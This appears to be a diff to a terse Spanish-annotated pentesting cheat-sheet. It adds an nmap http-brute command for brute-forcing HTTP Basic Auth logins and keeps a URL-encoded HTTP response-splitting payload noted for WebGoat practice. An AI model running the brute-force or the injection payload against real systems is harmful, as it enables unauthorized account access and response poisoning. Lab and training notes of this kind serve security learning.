@@ -1,3 +1,6 @@
+#HTTP Basic Auth
+	nmap -p [80/443] --script http-brute --script-args 'http-brute.hostname=URL,http-brute.method=[GET/POST],http-brute.path=PATH_TO_LOGIN,userdb=USERS,passdb=PASS' -v URL -n
+
 #HTTP Split Attack
 	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E
 	Decodearlo para ver contenido (Webgoat)
